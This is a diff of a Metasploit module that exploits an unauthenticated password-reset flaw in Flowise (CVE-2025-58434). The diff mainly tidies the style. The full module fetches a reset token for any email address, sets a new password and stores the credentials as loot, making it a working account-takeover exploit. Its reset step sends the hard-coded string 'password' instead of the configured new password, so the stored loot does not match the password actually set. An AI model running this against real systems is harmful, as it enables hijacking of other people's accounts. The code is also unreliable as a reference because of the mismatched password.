@@ -18,23 +18,23 @@ class MetasploitModule < Msf::Auxiliary
         'Description' => %q{
           In Flowise versions 3.0.5 and earlier, the `forgot-password` endpoint in Flowise returns sensitive information including
           a valid password reset `tempToken` without authentication or verification.
-          This enables any attacker to generate a reset token for arbitrary users and directly reset their password, leading to a 
+          This enables any attacker to generate a reset token for arbitrary users and directly reset their password, leading to a
           complete account takeover (ATO).
         },
         'License' => MSF_LICENSE,
         'Author' => [
-          'Richard howe <rhowe425>', 
+          'Richard howe <rhowe425>',
         ],
         'References' => [
           ['CVE', '2025-58434'],
           ['EDB', '52557'],
-          ['URL', 'https://github.com/FlowiseAI/Flowise/security/advisories/GHSA-wgpv-6j63-x5ph']
+          ['GHSA', 'wgpv-6j63-x5ph']
         ],
         'DisclosureDate' => '2025-09-12',
         'Notes' => {
           'Stability' => [ CRASH_SAFE ],
           'SideEffects' => [ IOC_IN_LOGS ],
-          'Reliability' => [],
+          'Reliability' => []
         }
       )
     )
@@ -49,13 +49,11 @@ class MetasploitModule < Msf::Auxiliary
     )
   end
 
-
   def check
     res = send_request_cgi({
       'method' => 'GET',
       'uri' => normalize_uri(target_uri.path, 'api/v1/version')
     })
-
 
     unless res && res.code == 200
       return Exploit::CheckCode::Unknown(
@@ -76,7 +74,6 @@ class MetasploitModule < Msf::Auxiliary
     )
   end
 
-
   def get_reset_token(email)
     res = send_request_cgi(
       {
@@ -86,16 +83,15 @@ class MetasploitModule < Msf::Auxiliary
           'Content-Type' => 'application/json'
         },
         'data' => {
-          'user' => {"email": "#{email}"}
+          'user' => { email: email.to_s }
         }.to_json
       }
     )
-    fail_with(Failure::Unknown, 'Unexpected server reply.') res&.code == 201
+    fail_with(Failure::Unknown, 'Unexpected server reply.') unless res && res.code == 201
     res.get_json_document['user']['tempToken']
   end
 
-
-  def reset_password(email, token, password)
+  def reset_password(email, token, _password)
     res = send_request_cgi(
       {
         'method' => 'POST',
@@ -104,42 +100,38 @@ class MetasploitModule < Msf::Auxiliary
           'Content-Type' => 'application/json'
         },
         'data' => {
-          'user' => {"email" => "#{email}", "tempToken" => "#{token}", "password" => "password"}
+          'user' => { 'email' => email.to_s, 'tempToken' => token.to_s, 'password' => 'password' }
         }.to_json
       }
     )
-    fail_with(Failure::Unknown, 'Unexpected server reply.') res&.code == 201
+    fail_with(Failure::Unknown, 'Unexpected server reply.') unless res && res.code == 201
   end
 
-def run
-  email = datastore['EMAIL']
-  reset_token = get_reset_token(email)
-  new_password = datastore['NEWPASSWORD']
-  
+  def run
+    email = datastore['EMAIL']
+    reset_token = get_reset_token(email)
+    new_password = datastore['NEWPASSWORD']
 
-  if reset_token.empty?
-    fail_with(Failure::UnexpectedReply, 'Could not retrieve password reset token for victim email address.')
-  end
+    if reset_token.empty?
+      fail_with(Failure::UnexpectedReply, 'Could not retrieve password reset token for victim email address.')
+    end
 
-  reset_password(email, reset_token, new_password)
+    reset_password(email, reset_token, new_password)
 
+    loot = {
+      'email' => email,
+      'password' => new_password
+    }.to_json
 
-  loot = {
-    "email" => email,
-    "password" => new_password
-  }.to_json
+    loot_path = store_loot(
+      'flowise.files',
+      'text/plain',
+      rhost,
+      loot,
+      'flowise.txt',
+      'Flowise login credentials retrieved via unauthenticated user password reset'
+    )
 
-  loot_path = store_loot(
-  'flowise.files',
-  'text/plain',
-  rhost,
-  loot,
-  'flowise.txt',
-  'Flowise login credentials retrieved via unauthenticated user password reset'
-  )
-
-  print_good("Loot stored in: #{loot_path}")
+    print_good("Password reset successful. Loot stored in: #{loot_path}")
   end
 end
-
-
